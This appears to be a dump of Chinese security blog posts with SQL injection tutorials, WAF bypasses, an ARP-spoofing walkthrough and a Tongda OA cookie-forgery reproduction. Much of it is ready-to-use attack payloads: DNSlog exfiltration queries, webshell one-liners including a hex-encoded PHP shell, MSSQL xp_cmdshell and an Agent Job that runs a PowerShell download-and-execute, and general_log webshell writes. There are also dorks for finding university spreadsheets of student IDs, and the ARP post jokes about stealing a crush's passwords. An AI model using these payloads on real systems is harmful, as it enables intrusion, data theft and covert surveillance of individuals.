//查询网页内容含有dedecms的页面5.filetype搜索文件类型与关键字匹配的文件filetype:xls //查询excel文件 内容敏感信息泄露1、搜索高校存在学号字眼的excel文件，用来获取学号信息语法：filetype:xls site:edu.cn 学号2、搜索高校域名中存在php?id=的页面，尝试测试是否存在SQL注入语法：site:edu.cn inurl:php?id=3、搜索高校的后台登录页面语法：site:edu.cn intitle:后台登录","path":"2020/10/02/如何进行信息收集/"},{"title":"Windows搭建weblogic环境","text":"介于网络上weblogic漏洞环境基本上都是通过docker+vulhub进行搭建的，而有的小伙伴想要通过windows来搭建而没有教程，下面我将向大家介绍如何通过windows来搭建weblogic环境。 1、下载好weblogic的安装文件，双击运行下载地址：https://www.oracle.com/middleware/technologies/weblogic.html 2、读条结束弹出安装界面 3、点击下一步，设置目录 4、设置好目录后，进入设置更新界面，这里将勾去掉，不更新。 5、下一步，安装类型选择典型即可 6、安装目录，这里我选择默认，也可以自行调整 7、快捷方式，直接下一步 8、安装概要，不配置，下一步 9、开始安装 10、安装成功 11、点击完成，弹出quickstart 12、点击getting started with WebLogic Server 10.3.6，创建新的域 13、点击下一步，这里默认即可 14、域名，就用默认的 15、下一步，设置名称和口令 16、设置好之后点击下一步，这里选择生产模式 17、下一步，可选设置，这里不选。 18、配置概要，默认即可，点击创建 19、完成 20、安装完成后，在这个路径下可以开启weblogic 1C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Oracle Enterprise Pack for Eclipse\\User Projects\\base_domain 22、双击打开，输入之前设置的用户名和密码，启动服务 23、打开192.168.137.1:7001/console/，成功访问管理登录界面","path":"2020/09/30/Windows搭建weblogic环境/"},{"title":"sql注入之重新学习","text":"SQL注入概念：SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。在owasp top 10常年霸占榜首漏洞的位置，可以当之无愧称它为漏洞之王。SQL注入是一个通过拼接sql查询语句获取数据库里面的数据的漏洞。常见的漏洞点为url中带有的id传参，如http://www.xxx.com/i.php?id=13。此处的13会通过php传参传到数据库进行查询，一般的查询语句为:select * from news where id=’13’。攻击者往往通过在id=13后面加入单引号闭合前面的查询内容后面加上union联合查询其他内容来获取数据。 SQL注入的条件1、用户可以控制输入的数据，可以控制传参的内容。2、用户传参的内容被拼接到了代码去执行。 判断是否存在SQL注入的具体流程:1、首先获取url：http://www.xxx.com/i.php?id=12、很明显这里的13是通过get传参被放到数据库查询语句中的我们可以控制的参数。一般的查询语句为select * from test where id=’1’3、接下来在1后面加个单引号，可以看到页面报错了，因为我们的1’被当成代码执行了，当前查询语句为：Selectfrom test where id =’1’’，比正常的多了一个单引号，所以导致页面报错了。因为我的输入的东西导致了页面发生了变化，特别是这种报错了，很明显存在SQL注入漏洞。4、接下来传参为1’ and 1=1 %23，页面返回正常，与id=1的页面相同。5、更换传参为1‘ and 1=2 %23，页面不一样了，查询不了数据库内的数据，当前查询语句为：Selectfrom test where id =’1’ and 1=2 #’这里先解释一下%23，众所周知的在mysql数据库中，#是注释符，能够注释掉后面的内容，但是在url栏中，#有锚点的作用，所以说我们如果需要注释后面的单引号，需要使用url编码后的#，也就是%23。在这里看到and 1=1页面返回正常，and 1=2 页面返回不正常。从渗透测试的角度判断就是代码被执行了，我们通过输出的查询语句也看到了1=1和1=2被放到查询语句查询了，因为中间的连接符是and，在1=2的时候恒为假，所以查询不出内容。两者不同，也就判断出当前存在SQL注入漏洞。 SQL注入分类显错注入有回显数据的注入，可以通过union select联合查询将想要的数据返回到页面上的一种注入。在对于SQL注入的渗透测试过程中，我们的传参返回的内容可以在页面上输出，这种时候就可以用显错注入。接下来将详细介绍如何进行显错注入。1、首先可以看到，传参id=1会输出两个数据：login name和password。2、加个单引号，页面报错了3、通过后面拼接and 1=1 %23来查看代码是否成功执行，可以看到页面返回正常了，闭合成功。4、通过order by判断当前数据表中的字段数。通过order by 3的时候页面正常，order by 4的时候页面错误可以判断出当前字段数为3。5、联合查询获取数据。首先将前面的1改为-1，因为在数据库查询语句中默认会输出前面查询的东西的，将1改为-1会使前面查询不到内容，那么就会输出后面union select联合查询的数据。可以看到将2和3输出出来了，这里就是我们需要的显错注入的显错点。6、有了显错点，接下来只需要将要查询的代码替换2和3即可获取想要的数据下面查询flag表中的flag数据。 1?id=-1&#x27; union select 1,flag,3 from flag %23 报错注入通过报错函数updatexml()、extractvalue()配合子查询将数据借助报错信息输出给我们的一种注入。在渗透测试过程中，经常会遇到网站因为用户的一些操作而产生代码运行错误并将错误信息返回到页面中的情况，这种时候可以通过报错注入获取数据。接下来将详细介绍如何进行报错注入。1、在传参中输入单引号让页面产生错误，这里看到将报错信息返回到页面了。2、尝试通过单引号和%23注释来进行闭合发现闭合错误，这时候就需要考虑，是否当前页面的传参本身没有单引号，不需要闭合。3、删除单引号与%23，发现页面正常了，说明这里为int类型的传参，不需要单引号闭合。4、使用报错函数updataxml()查询当前数据库库名。payload如下：?id=1 and updatexml(1,concat(0x7e,(select database())),1)这里updatexml的语法为后面跟上3个数据，我们在第二个数据中拼接0x7e和子查询(select database())来获取数据。这里0x7e为十六进制的~，用来使函数报错的，没有实际意义。子查询即在括号中的查询语句，与数学中一样，括号中的东西先执行。所以这里的流程为先子查询获取了数据，然后拼接波浪线报错，输出到页面中。5、获取flag表中的数据。http://127.0.0.1/sqli-labs-master/sqli-labs-master/Less-2/?id=1 and updatexml(1,concat(0x7e,(select flag from flag)),1)6、因为报错函数输出的东西有长度限制，所以对于这种数据长度值超过的数据，我们需要通过截取函数substring()来获得。获取第一个字符开始的20个数据：?id=1 and updatexml(1,concat(0x7e,substring((select flag from flag),1,20)),1)获取第21个字符开始的20个数据，（不足20个则显示剩下的数据）：?id=1 and updatexml(1,concat(0x7e,substring((select flag from flag),21,20)),1) 盲注对于SQL注入的测试过程中存在这样的情况，输入的传参只会返回是否有数据而不会将查询的东西输出到页面上，然后不显示错误页面，这种时候就要尝试盲注来获取数据。盲注又分为布尔盲注和延时盲注。 布尔盲注布尔盲注，盲注的一种，当网站通过查询语句的布尔值返回真假来输出页面信息的时候，查询语句为真，页面输出内容；查询语句为假，页面不输出内容。那么这里就可以通过构造等号判断，获取相应的字符的ascii码，最后还原出数据。具体测试过程如下：1、id传参1之后，页面返回有数据，这里明显不能进行显错注入了。2、在传参后面加个单引号，页面返回空，不显示错误信息，不能使用报错注入。3、通过拼接and 1=1和and 1=2，发现页面对于布尔值的真与假返回的页面结果也不同。4、通过length()函数判断数据库库名的长度大于1。?id=1’ and length(database())&gt;1 %235、在大于8的时候页面返回空，所以数据库库名长度等于8。6、通过ascii()函数和substr ()截取函数获取数据库库名的第一个字符的ascii码?id=1’ and ascii(substr((select database()),1,1))&gt;97 %23?id=1’ and ascii(substr((select database()),1,1))=101 %23首先用大于号判断出大概所处的值，最后使用等于号验证ascii码的值。此处得出数据库库名的第一个字符的ascii码值为115，对应字符为s。7、更改截取的位置，判断后面的字符对应的ascii码值。?id=1’ and ascii(substr((select database()),2,1))=101 %23 延时盲注延时盲注，一种盲注的手法。在渗透测试过程中当我们不能使用显错注入、报错注入以及布尔盲注无论布尔值为真还是为假，页面都返回一样之后，我们可以尝试使用延时盲注，通过加载页面的时间长度来判断数据是否成功。在PHP中有一个if()函数，语法为if(exp1,exp2,exp3)，当exp1返回为真时，执行exp2，返回为假时，执行exp3。配合延时函数sleep()来获取相应数据的ascii码，最后还原成数据。下面我将通过实例来介绍如今进行延时盲注。1、首先获取的页面如下，后面不论接上布尔值为真还是为假的，页面都返回一样，此时将不能使用布尔盲注。2、通过and拼接延时函数查看页面是否有延时回显。首先记录没有使用延时函数的页面返回时间，为4._秒；使用sleep(5)延时5秒之后，页面响应时间为9._秒，说明对于我们输入的sleep()函数进行了延时处理，此处存在延时盲注。3、通过延时注入判断数据库库名的长度。一个个测试发现当长度等于8时页面延时返回了，说明数据库库名长度为8。?id=2’ and if((length(database())=8),sleep(5),1) %234、与布尔盲注一样，将子查询的数据截断之后判断ascii码，相等时延时5秒。最后得到第一个字符的ascii码为115。?id=2’ and if((ascii(substr((select database()),1,1))=115),sleep(5),1) %235、后面替换截断的位置，测试后面的字符的ascii码值。最后得到对应的ascii码值为115 101 99 117 114 105 116 121。通过ascii解码工具解得数据库库名为security。 宽字节注入为了防止sql注入，在网站配置上会开启魔术引号。当打开时，所有的 ‘（单引号），”（双引号），\\（反斜线）和 NULL 字符都会被自动加上一个反斜线进行转义。也就是说，在我们输入’（单引号）或者”（双引号）进行闭合的时候，程序会自动在前面加上\\（反斜线），将其转义成字符串，也就是失去了本来的用法，变成了字符串输入，无法进行闭合，即不能使输入的代码正常执行。在mysql中，用于转义的函数有addslashes()，mysql_real_escape_string()，mysql_escape_string()等。 宽字节注入具体解析过程:1、在id传参后面加上%df和单引号2、$_GET[‘id’] 经过 addslashes编码之后带入了‘\\’，即?id=1%df\\’ and 1=1 %23url编码为：?id=1%df%5C%27%20and%201%3D1%20%233、PHP将处理好的数据带入mysql处理时使用了gbk编码4、%df%5c 编码后为“運” 成功的吃掉了%5c，也就是\\（反斜线）5、处理后的查询数据为?id=1運’ and 1=1 %23，单引号成功闭合 实例演示：1、在id传参之后加个单引号，我设置了将传参输出出来，可以看到单引号前面加了一个反斜线。2、通过宽字节注入将反斜线“吃”掉，合成一个汉字，这里因为浏览器设置的字符为UTF-8，所以输出的汉字为�。通过页面报错可以判断出，单引号已成功闭合。3、接下来通过order by判断数据库当前字段数，因为order by 4的时候页面报错了，所以当前字段数为3。4、通过union select 判断出注入点为2和3。5、通过注入点3获取flag数据表中的flag字段的数据。 巧用dnslog进行SQL注入前面介绍了SQL注入中的盲注，通过布尔盲注或者延时盲注来获取数据需要的步骤非常繁琐，不仅需要一个一个字符的获取，最后还需要进行ascii解码，这需要花费大量的时间与精力。为了加快渗透进程，以及降低获取数据的难度，这里介绍如何通过dnslog进行SQL注入。 Dnslogdnslog，即dns日志，会解析访问dns服务的记录并显示出来，常被用来测试漏洞是否存在以及无法获取数据的时候进行外带数据。简单来说，dnslog就是一个服务器，会记录所有访问它的记录，包括访问的域名、访问的IP以及时间。那么我们就可以通过子查询，拼接dnslog的域名，最后通过dns日志得到需要的数据。 Load_file()函数数据库中的load_file()函数，可以加载服务器中的内容。load_file(‘c:/1.txt’)，读取文件并返回内容为字符串，使用load_file()函数获取数据需要有以下几个条件：1.文件在服务器上2.指定完整路径的文件3.必须有FILE权限 UNC路径UNC路径就是类似\\softer这样的形式的网络路径。它符合 \\服务器名\\服务器资源的格式。在Windows系统中常用于共享文件。如\\192.168.1.1\\共享文件夹名。 Dnslog注入实例演示1、打开实例站点，很明显这里是只能使用盲注的站点。2、通过order by判断出字段数为3。3、在dnslog网站申请一个dnslog域名：pcijrt.dnslog.cn4、通过load_file函数拼接查询数据库库名的子查询到dnslog的域名上，后面任意接一个不存在的文件夹名。最后将这个查询放到联合查询中，构造的payload如下：?id=1 ‘ union select 1,2,load_file(concat(‘//‘,(select database()),’.pcijrt.dnslog.cn/abc’)) %235、执行语句之后在dnslog日志中获取到数据库库名为security。6、修改子查询里的内容，获取其他数据。 SQL注入写入webshellWebshellWebshell，以asp、php、jsp或者cgi等网页文件形式存在的一种代码执行环境，也可以将其称做为一种网页后门。攻击者可以通过获取webshell来对网站进行操作，包括任意文件上传下载、查看数据库、执行任意程序代码等。常见webshell分类如下：jsp&lt;%Runtime.getRuntime().exec(request.getParameter(“i”));%&gt;aspsuccess!!!!&lt;%eval request(“cmd”)%&gt;php out_file&amp;dump_file在dnslog注入中我们了解到了mysql数据库中可以通过load_file加载读取服务器上的文件，与之对应的则是通过out_file和dump_file读取文件。写入webshell需要具有几个条件：当前数据库用户为root、具有写入文件的权限、拥有当前站点的绝对路径。通过sql注入写webshell的具体用法：select into outfile ‘C:/phpStudy/WWW/1.php’select into dumpfile ‘C:/phpStudy/WWW/1.php’二者的区别在于，outfile函数可以导出多行，而dumpfile只能导出一行数据；outfile函数在将数据写到文件里时有特殊的格式转换，而dumpfile则保持原数据格式。在写文件的时候，因为是在传参中写入的，总会被一些单引号，美元符等具有特殊意义的字符影响，这时候我们能够通过将需要传输的文件内容进行16进制转换再传入数据库中执行，mysql数据库会解析16进制的内容，那么就可以不受特殊字符影响写入webshell了。 SQL注入如何绕过waf在进行渗透测试的时候，经常会遇到被waf拦截的情况。waf，也就是网站防火墙，专业术语是Web应用防护系统，即Web Application Firewall。Waf对于渗透测试人员来说，也就是规则，通俗点就是这个结构:If(xxx){拦截！}else{通过}所以只需要让它同意我的操作，即绕过了waf。通常的waf一般可以有以下绕过方法： 1、大小写绕过?id=1 and UnIoN sElEcT 1,2,3?id=1 OrDeR By 1 2、双写绕过一些防护措施只进行一次，可以通过双写关键字的方法绕过。Id=1 ununionion selselectect 1,2,3 删除一次–&gt; union selectId=1 ororderder bbyy 1 删除一次–&gt; order by 3、编码绕过如果检测的是关键字，那么经过编码即可绕过URL全编码：十六进制（使用时需要在转换后的字符串前加0x，作为告诉数据库这里是十六进制的标识）： 4、基本符号替换用&amp;&amp;替换and用||替换or用/**/替换空格URL栏中用+替换空格 5、报错注入替换函数绕过有的时候，网站只检测一部分热门的函数，不检测一些冷门的函数。下面以select user() 为例，给出几种报错注入的payload：1.floor()id = 1 and (select 1 from (select count(_),concat(user(),floor(rand(0)_2))x from information_schema.tables group by x)a)2. extractvalue()id = 1 and (extractvalue(1, concat(0x5c,(select user()))))id = 1 and extractvalue(1,concat(char(126),database()))3. updatexml()id = 1 and (updatexml(0x3a,concat(1,(select user())),1)) 4.exp()exp(~(select * from(select user()))a)) 5.GeometryCollection()Id=1 and GeometryCollection((select _ from(select _ from(select user())a)b)) 6.Polygon Id = 1 and polygon((select _ from (select _ from(select user())a)b)) 7.Multipoint() Id = 1 and Multipoint ((select _ from (select _ from(select user())a)b)) 8.Multilinestring() Id = 1 and Multilinestring ((select _ from (select _ from(select user())a)b)) 9.multipolygon Id = 1 and multipolygon ((select _ from (select _ from(select user())a)b)) 10.linestring() Id = 1 and linestring ((select _ from (select _ from(select user())a)b)) 6、其他等价函数绕过hex()、bin() ==&gt; ascii()sleep() &gt;benchmark()concat_ws()&gt;group_concat()mid()、substr() ==&gt; substring()@@user ==&gt; user()@@database ==&gt; database() 7、内联注释配合注释绕过Id=1/**//! order/+/!by/+1 8、%0a换行跳出单行注释绕过原理：数据库中对于#和–（空格）后面的东西都进行注释忽略处理我们通过waf一般不会处理注释内的东西这一特性进行绕过，在%23（url解码为#）后面放%0a换行再放入执行语句，中间可以多次经过%23%0a进行绕过。ps:在%23和%0a中间可以随意加入字符，放置注释掉了。Payload：id=2%20+%231q%0AOrDeR%20%23adsf%0A%23%0ABy%201id=-2%20+%231q%0AuNiOn%20all%23adsf%0A%23%0AsEleCt%201,2,3 9、利用一些中间件的缺陷（1）IIS+ASP通过在关键词之间加%绕过。Id=1 and uni%on se%le%ct 1,2,3 from ad%min（2）IIS的Unicode编码IIS支持Unicode编码，可以通过编码关键词进行绕过：（3）HTTP参数污染有的时候，浏览器对于这样的传参会出现以下情况：Id=1 and id=2 –&gt; 出现在服务器中，id=1,2那么我们可以这样绕：id=1 and union select username &amp; id= password form admin–&gt; id=1 and union select username, password form admin 对于这种参数重复传参的情况，不同环境有不同结果： 10、更换传参方式绕过在有些情况下，因为$_REQUEST[‘id’]的特性，我们可以将get传参的id=1切换成post传参，有些waf只针对了get传参进行防御而忽略了post传参或者cookie传参。 11、利用数据提取方式的缺陷进行绕过Example：在PHP+Apache中x=1&amp;y=2&amp;z=3 在某些waf中会被提取为：x=1y=2z=3payload:id=1+union+/&amp;x=2/+select/&amp;y=3/+1,2,3+from+adminwaf检测方式为分别检测三个传参：id=1+union+/*x=2_/+select/_y=3*/1,2,3+from+admin 数据库中，/**/中间的东西被过滤了，获得的传参为：id=1+union+select+1,2,3+from+admin 12、脏数据绕过在被waf拦截之后，更改传参方式为POST，再通过在传参处放入大量无用数据绕过waf。下面给出生成垃圾数据的脚本：#coding=utf-8import random,stringfrom urllib import parsecode by yzddMr6 varname_min = 5varname_max = 15data_min = 20data_max = 25num_min = 50num_max = 100def randstr(length):str_list = [random.choice(string.ascii_letters) for i in range(length)]random_str = ‘’.join(str_list)return random_strdef main():data={}for i in range(num_min,num_max):data[randstr(random.randint(varname_min,varname_max))]=randstr(random.randint(data_min,data_max))print(‘&amp;’+parse.urlencode(data)+’&amp;’)main() SQL注入实战渗透测试1、首先打开指定站点，这里是以beescms搭建的网站 2、通过御剑扫描发现了后台路径/admin/login.php3、访问后台4、抓包并发送到重放数据包模块进行测试5、在账号处加一个单引号测试，发现页面报错了，这里说明存在SQL注入6、打开源码，找到该登录处，发现对于post传参的user进行了函数fl_value和fl_html处理。处理之后后面就放到check_login函数执行了。7、定位fl_value函数，发现对于SQL注入进行了处理，将敏感字符过滤为空。过滤的敏感字符有：select | insert | update | and | in | on | left | joins | delete | %| = | / * | * | ../ | ./ | union | from | where | group | into | load_file | outfile8、很明显这里防SQL注入进行的不是很到位，只进行了一次替换为空，那么就可以通过双写关键字进行绕过。定位第二个处理函数fl_html，发现这里是进行了html实体化处理，是防止xss的，htmlspecialchars函数默认情况下只对双引号进行编码，对我们使用单引号进行SQL注入没有影响。9、跟进check_login函数，发现将传入的数据直接放到了SQL查询语句进行查询。那么此处通过双写即可绕过进行注入了。10、回到网站，通过order by 判断出当前数据库字段数为511、经测试，联合查询终于成功了。绕过方法：un union ion -&gt; unionseselectlect -&gt; select12、这里很明显不能显错注入，尝试使用报错注入获取数据也失败，没有将报错的数据输出出来。13、尝试使用sql注入写入webshell，发现页面报错了，通过报错信息可以看到是写入的一句话木马里面带有特殊字符影响了文件的写入。对于敏感字符的绕过方法：in into -&gt; intoououtfiletfile -&gt; outfile14、因为符号进行了影响，所以通过16进制来写入webshell，将一句话木马转换为16进制。因为需要数据库识别出这个是16进制的数据，所以要在最前面加上0x。得到16进制的一句话木马：0x3c3f70687020406576616c28245f524551554553545b315d293b3f3e15、替换16进制的一句话木马到burp数据包中放包，成功执行了代码，页面返回正常。16、查看服务器文件，成功有了一个8.php文件，内容为一句话木马。17、通过菜刀工具，连接一句话木马，获取网站webshell。18、进行执行系统命令操作。 其他类型的SQL注入1、搜索框注入12?id=1&#x27; and &#x27;1%&#x27;=&#x27;1 //返回正确的搜索结果?id=1&#x27; and &#x27;1%&#x27;=&#x27;2 //没有返回结果 2、header头部注入Client-IPUser-AgentX-Forwarded-For SQL注入利用1、MSSQL0x01 –os-shell12345for /r C: %i in (*020.jpg*) do @echo %i //寻找020.jpg，获取所在目录dir c:\\phpstudy\\WWW\\image //列出某目录下文件echo ^&lt;%@ Page Language=&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.Item[&quot;1&quot;],&quot;unsafe&quot;);%^&gt; &gt; c:\\phpstudy\\WWW\\image\\shell.asp 0x02 命令执行1、xp_cmdshell 12345678#开启xp_cmdshell?id=1;use master;exec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;exec sp_configure &#x27;xp_cmdshell&#x27;,1;reconfigure;#执行?id=1;use master;exec master..xp_cmdshell &quot;whoami&quot;;#恢复被删除的xp_cmdshell(提示xplog79.dll找不到则自己上传)exec sp_addextendedproc xp_cmdshell ,@dllname=&quot;D:\\\\xplog79.dll&quot; 2、sp_oacreate 12345678910#xp_cmdshell删除后可以使用sp_oacreate#开启sp_oacreateexec sp_configure &#x27;show advanced options&#x27;,1;reconfigure with override;exec sp_configure &#x27;Ole Automation Procedures&#x27;,1;reconfigure with override;exec sp_configure &#x27;show advanced options&#x27;,0;#执行[此方法无回显]declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\\windows\\system32\\cmd.exe /c whoami &gt;d:\\\\temp\\\\1.txt&#x27; 3、通过沙盒执行命令4、注册表5、通过Agent Job执行命令 12#执行cs powershell命令USE msdb; EXEC dbo.sp_add_job @job_name = N&#x27;test_powershell_job1&#x27; ; EXEC sp_add_jobstep @job_name = N&#x27;test_powershell_job1&#x27;, @step_name = N&#x27;test_powershell_name1&#x27;, @subsystem = N&#x27;PowerShell&#x27;, @command = N&#x27;powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;&#x27;http://192.168.214.129:80/a&#x27;&#x27;))&quot;&#x27;, @retry_attempts = 1, @retry_interval = 5 ;EXEC dbo.sp_add_jobserver @job_name = N&#x27;test_powershell_job1&#x27;; EXEC dbo.sp_start_job N&#x27;test_powershell_job1&#x27;; 0x03 文件操作1、判断文件是否存在 12#返回0表示不存在，返回1表示存在exec xp_fileexist &quot;c:\\\\users\\\\public\\\\test.txt&quot; 2、列目录 12#第一个参数表示要查看的文件夹，第二个参数表示递归层数，第三个参数表示展示的内容包括文件。exec xp_subdirs &quot;C:\\Users\\Administrator\\&quot;,2,1 3、写文件 123#开启Web Assistant Proceduresexec sp_configure &#x27;Web Assistant Procedures&#x27;,1;RECONFIGURE;exec sp_makewebtask &#x27;c:\\www\\testwr.asp&#x27;,&#x27;select&#x27;&#x27;&lt;%execute(request(&#x27;ss&#x27;))%&gt;&#x27;&#x27; 4、创建目录 1exec xp_create_subdir &#x27;D:\\test&#x27; 0x04 信息获取1234exec xp_getnetname //计算机名exec xp_msver //系统信息exec xp_fixeddrives //驱动器信息select default_domain() as mydomain; //获取域名 2、MYSQL在高版本的mysql中，一般默认配置了–secure_file_priv为null限制了文件写入，这种情况就需要通过general_log_file/show_query_log_file来尝试写文件。 12345#general_log_fileset global general_log=&#x27;on&#x27;;set global general_log_file=&#x27;D:/phpStudy/WWW/1.php&#x27;;select &#x27;&lt;?php assert($_POST[1]);?&gt;&#x27;;set global general_log=&#x27;off&#x27;; //切记关闭 12345#show_query_log_fileset global show_query_log=&#x27;on&#x27;;set global show_query_log_file=&#x27;D:\\\\phpStudy\\\\WWW\\\\1.php&#x27;;select sleep(15),&#x27;&lt;?php assert($_POST[1]);?&gt;&#x27;;set global show_query_log=&#x27;off&#x27;; //切记关闭","path":"2020/09/02/sql注入之重新学习/"},{"title":"如何偷偷了解女神——ARP毒药攻击","text":"最近学习了一种攻击——ARP毒药攻击。中间人攻击，也叫ARP欺骗，能够通过arp欺骗获取用户的数据，那么认真想想，这样能不能让自己更加了解女神呢，接下来就让我们来了解一下这个强大的攻击手法吧。 中华人民共和国网络安全法文章开头，先学习一下中华人民共和国网络安全法，大家要做一名合法的白帽子，不要做一些违法乱纪的事情。https://www.cto.ac.cn/thread-106.htm 环境准备1.攻击机：kali虚拟机 （ip:192.168.163.128） 2.被攻击机：windows sever 2008 （ip: 192.168.163.131） 3.网关：win10物理机 （ip: 192.168.163.2） 攻击原理访问一个地址需要一种协议叫ARP协议，我们的主机通过ARP协议获取了对应ip地址的mac地址来进行访问。 情况是这样的，A访问某网站需要经过网关，这往往是直连的，但是第三方B，通过向A和网关发送数据包，修改了他们的mac地址指向了B，也就是说，A访问网关的数据包都会经过B再到达网关，达到了中间人攻击的效果。 攻击过程1.首先打开攻击机kali和靶机Windows server 2008 2.在靶机命令行处通过arp –a命令获取了当前mac地址，网关192.168.163.2的mac地址为00-50-56-f3-04-25 3.攻击机机也查看一下，查看了当前mac地址为00:0c:29:bc:fd:f2 4.准备充分了，接下来在攻击机打开软件ettercap，通过-G参数打开图形化界面 5.刚打开的界面需要先选择收取信息的网卡，一般默认的eth0即可，然后打上勾勾进入软件。 6.进入软件后，额，因为是英文的，会有点烦，不过我们可以通过按钮来操作。先点击那个放大镜按钮获取当前网段存在的主机。 然后点击那个展示按钮查看信息。 7.接下来就是选择目标了，将靶机192.168.163.131加入target 1；将网关192.168.163.2加入target2（这里也可以批量欺骗，就是target1可以加入多个进行欺骗） 8.选完了目标之后，可以进行攻击了。点击右上角那个地球一样的按钮，选择第一个ARP pois……；进去之后选择第一个sniff remote connections（嗅探远程连接） 打勾，点ok就可以了。 9.开始攻击之后在页面下面是可以看到已经建立了连接。 同样的，在靶机上也可以看到，网关的mac地址变了，变成了跟攻击机的地址一样了，这也就是说，已经欺骗成功了 10.这就算攻击成功了吗?当然没有，接下来就是当靶机进行网络访问，登录账号密码的时候，能够在攻击机上查看到账号密码。先使用靶机登录某界面。 11.为了能够直观点我将密码显示出来（在密码处右键检查，在弹出来的框处找到type=”password”，修改成type=”text”即可）。 12.点击了登录后，回到攻击机，已经获取了账号密码以及被我打码的网址。 总结就这样，我们获取了靶机的账号密码，如果是想要女神的账号密码，只需要想办法将ip弄到手就可以了哦。当然这里不仅仅是获取账号密码，可以使用其他抓包软件，获取其他数据包。当然这里还是以学习为主，大家开开玩笑就好，不要真的去偷人家数据。 ARP欺骗防御arp欺骗当然也是可以防御的，对于我们客户端，可以将mac地址设置为静态的，只允许手动更改。对于服务器端，可以对于站点加个ssl加密，也就是http – &gt; https。 参考链接：https://www.cnblogs.com/ichunqiu/p/5662832.html","path":"2020/05/28/如何偷偷了解女神——ARP毒药/"},{"title":"MySQL数据库的dnslog注入","text":"MySQL数据库作为使用数量最多的数据库，今天为大家带来一个dns注入教程，dns注入使用方法一般是在显错注入,报错注入都不能使用，盲注又太麻烦的情况下进行的，通过load_file()函数，解析dns的时候，将子查询的数据放入到dns日志中来获取数据。 中华人民共和国网络安全法我们要做一名合法的白帽子！ dns注入使用前提1.数据库为Mysql2.在mysql.ini配置文件里面需要有一句：secure_file_priv=3.注入需要使用load_file()函数，通过该函数可以读取本地文件里面的字符串内容，当然也可以访问UNC路径的内容。 Dnslog 注入具体流程1.首先打开靶场 2.通过源码发现，这里需要get传参一个id，尝试一下，页面没什么变化 3.那就常规思路进行尝试，先加个单引号，页面报错了，说明存在sql注入 4.闭合之后想要order by 猜当期字段数的，发现有安全狗 5.Apache中间件有一个特性，从右到左解析，遇到不认识的后缀就往前面解析，这里通过安全狗对后缀的局限性成功绕过（txt文件后缀传参不检测） 6.通过sleep()函数发现可以执行，页面延迟了，不需要单引号闭合 7.也就是这里可以通过延时盲注获取数据了，不过太麻烦了，我们使用新方法，通过dnslog获取数据库库名，首先申请一个域名(网址为http://dnslog.cn/ ，这里一般我们是需要有自己的dns服务器，然后让数据库访问我们的服务器进行dns解析的，但是搭建自己的服务器实在太麻烦了，于是就有先人搭建了服务器dnslog，我们可以先点击Get SubDomain申请一个域名，然后点击Refresh Record获取日志信息) 8.前面知道了函数load_file()，我们可以通过访问（子查询）+dns获取的域名+目录名，使得数据库访问网络路径并解析dns，将数据放到我们的dnslog中，这里我这样构造payload获取数据库库名。 1?id=1 or load_file(concat(&#x27;//&#x27;,(select database()),&#x27;.e124fu.dnslog.cn/abc&#x27;)) 9.回到dnslog的页面访问日志看到库名为mangzhu 10.接下来就是替换子查询里面的内容获取其他数据了，这里我就获取数据库第一个表的表名为admin 1?id=1 or load_file(concat(&#x27;//&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&#x27;.e124fu.dnslog.cn/abc&#x27;)) 11.第二个表名为news 12.接下来获取admin表的字段 1?id=1 or load_file(concat(&#x27;//&#x27;,(select column_name from information_schema.columns where table_name=&#x27;admin&#x27; limit 0,1),&#x27;.e124fu.dnslog.cn/abc&#x27;)) 可以看到有username，password 13.一般我们就是获取里面的username和password字段的值 1id=1 or load_file(concat(&#x27;//&#x27;,(select username from admin where Id=1),&#x27;.e124fu.dnslog.cn/abc&#x27;)) 14.第一个username值为flag，那就获取对应的第一个password的值，得到flag 1id=1 or load_file(concat(&#x27;//&#x27;,(select password from admin where Id=1),&#x27;.e124fu.dnslog.cn/abc&#x27;)) 15.提交flag，成功通关！","path":"2020/05/23/MySQL数据库的dnslog注入/"},{"title":"复现：通达OA任意以管理员身份进入后台","text":"日前通达OA爆出一个大漏洞，用户可以在登录界面，通过修改cookie的方式，以管理员身份登录后台，这里我就来复现一次。 通达OA说到通达OA，大家应该都不陌生吧。通达OA（Office Anywhere网络智能办公系统）是某公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。说白了，通达OA是一个网站模板，有很多网站在使用。POC地址：https://github.com/NS-Sp4ce/TongDaOA-Fake-User 中华人民共和国网络安全法在这里提醒一下，作为一名白帽子，大家一定不要做一些违法乱纪的事。文章开头先学习一下中华人民共和国网络安全法： 复现步骤1.首先打开网络空间搜索引擎FOFA（非常强大）地址：https://fofa.so/ 2.在搜索栏处搜索输入“通达OA” 会看到很多可以选择的以ip或域名访问的界面，这里基本上都是以通达OA搭建的网站。 3.随便打开一个，会出现一个登录界面 4.通过运行前面给的poc获取一个新的cookie 5.修改cookie为新生成的cookie（修改cookie的方法有很多，这里我用的是插件） 6.修改好了之后，访问url下的general目录下的index.php文件 1example：http：//www.xxx.com/general/index.php 7.可以看到，已经成功以管理员身份登录后台 Over…","path":"2020/05/13/复现：通达OA任意以管理员身份进入后台/"},{"title":"干货：SQL注入如何绕过WAF","text":"在进行渗透测试的时候，各式各样的waf层出不穷，阻拦了我们渗透测试的步伐。为了让大家少走一些弯路，我特地为大家出一篇文章，教大家如何绕过waf。 几种WAF的图片 这就是waf，也就是网站防火墙，专业术语是Web应用防护系统，即Web Application Firewall。对于刚接触渗透测试的我来说，辛酸泪历史已经可以写一本书了，书名叫“那些年拦截住我的waf”。 首先对于我们来说，需要知道一点，对于网站来说，在我们能力水平有限的情况下，是存在waf无法绕过的情况，这是很正常的，如果遇到实在过不去的 waf，该放弃时还是放弃吧。 Waf对于我来说，也就是规则，通俗点就是这个结构: 12345if(xxx)&#123; 拦截！&#125;else&#123; 通过&#125; 也就是说，我们只需要让它同意我们的操作，即绕过了waf。 通常的waf一般可以有以下绕过方法： 